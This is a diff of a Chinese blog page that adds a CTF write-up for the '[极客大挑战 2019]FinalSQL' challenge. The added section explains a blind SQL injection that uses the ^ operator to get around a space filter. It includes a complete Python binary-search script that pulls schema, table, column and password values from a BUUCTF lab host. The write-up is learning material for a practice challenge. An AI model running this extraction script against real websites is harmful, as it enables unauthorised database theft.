@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.3k 字
+      1.7k 字
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      17
+      23
        分钟
     </span>
   
@@ -241,7 +241,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：20 天前
+                  本文最后更新于：4 分钟前
                 
               </p>
             
@@ -384,6 +384,63 @@ $result = mysqli_query($con, $sql);
 
 <p><code>b59c67bf196a4758191e42f76670ceba</code>是1111的md5值，pw的值为1111</p>
 <p><img src="https://i.loli.net/2020/11/30/Xhp1PgH7QlejDYn.png" srcset="/img/loading.gif" alt></p>
+<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>与hard sql是一个系列的，但是这个应该是盲注</p>
+<p>在search.php中找到注入点，测试可以发现是数字型注入</p>
+<p> fuzz之后可以发现对于不同的字符，回显不同，并且过滤了空格，但是<code>^</code>没有被过滤，所以可以利用这个符号</p>
+<p>可以看到当id = 1 时，页面回显为，可以将这个为判断的标志</p>
+<p><img src="https://i.loli.net/2020/12/23/DO6SQjuJLqm9ycM.png" srcset="/img/loading.gif" alt="image-20201223090038080"></p>
+<div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">1</span>^<span class="hljs-number">1</span>^<span class="hljs-number">1</span> = <span class="hljs-number">1</span>
+<span class="hljs-number">1</span>^<span class="hljs-number">0</span>^<span class="hljs-number">1</span> = <span class="hljs-number">0</span></code></pre></div>
+
+<p>所以可以将注入的payload加到中间，例如</p>
+<div class="hljs"><pre><code class="hljs perl"><span class="hljs-number">1</span>^(<span class="hljs-keyword">ord</span>(<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span>(group_concat(schema_name))from(information_schema.schema
+ta)),%d,<span class="hljs-number">1</span>))=%d)^<span class="hljs-number">1</span><span class="hljs-string">"%(i,ord(j))</span></code></pre></div>
+
+<p>注入脚本如下，使用的是二分法</p>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> time
+
+url = <span class="hljs-string">"http://6b5514f4-7df0-47b1-bca4-d13013ffd5d9.node3.buuoj.cn/search.php"</span>
+flag = <span class="hljs-string">''</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">payload</span><span class="hljs-params">(i, j)</span>:</span>
+    time.sleep(<span class="hljs-number">1</span>)
+    <span class="hljs-comment"># sql = "1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1"%(i,j)                                #数据库名字          </span>
+    <span class="hljs-comment"># sql = "1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))&gt;%d)^1"%(i,j)           #表名</span>
+    <span class="hljs-comment"># sql = "1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))&gt;%d)^1"%(i,j)        #列名</span>
+    sql = <span class="hljs-string">"1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1"</span> % (i, j)
+    data = &#123;<span class="hljs-string">"id"</span>: sql&#125;
+    r = requests.get(url, params=data)
+    <span class="hljs-keyword">if</span> <span class="hljs-string">"Click"</span> <span class="hljs-keyword">in</span> r.text:
+        res = <span class="hljs-number">1</span>
+    <span class="hljs-keyword">else</span>:
+        res = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">return</span> res
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">global</span> flag
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>):
+        print(i, <span class="hljs-string">':'</span>)
+        low = <span class="hljs-number">31</span>
+        high = <span class="hljs-number">127</span>
+        <span class="hljs-keyword">while</span> low &lt;= high:
+            mid = (low + high) // <span class="hljs-number">2</span>
+            res = payload(i, mid)
+            <span class="hljs-keyword">if</span> res:
+                low = mid + <span class="hljs-number">1</span>
+            <span class="hljs-keyword">else</span>:
+                high = mid - <span class="hljs-number">1</span>
+        f = int((low + high + <span class="hljs-number">1</span>)) // <span class="hljs-number">2</span>
+        <span class="hljs-keyword">if</span> (f == <span class="hljs-number">127</span> <span class="hljs-keyword">or</span> f == <span class="hljs-number">31</span>):
+            <span class="hljs-keyword">break</span>
+        <span class="hljs-comment"># print (f)</span>
+        flag += chr(f)
+        print(flag)
+exp()
+print(<span class="hljs-string">'flag='</span>, flag)</code></pre></div>
+
+<p>又学到了新的注入姿势，真不错</p>
+<p>参考：<a href="https://www.cnblogs.com/wangtanzhi/p/12305052.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12305052.html</a></p>
 
             </div>
             <hr>
@@ -413,29 +470,6 @@ $result = mysqli_query($con, $sql);
               
                 <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
               
-              
-                <div class="post-prevnext row">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2020/10/08/buuoj-z7z8/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">buuctf-z7z8</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2020/09/28/BJDCTF2020/">
-                        <span class="hidden-mobile">BJDCTF2020</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
               
             </div>
 
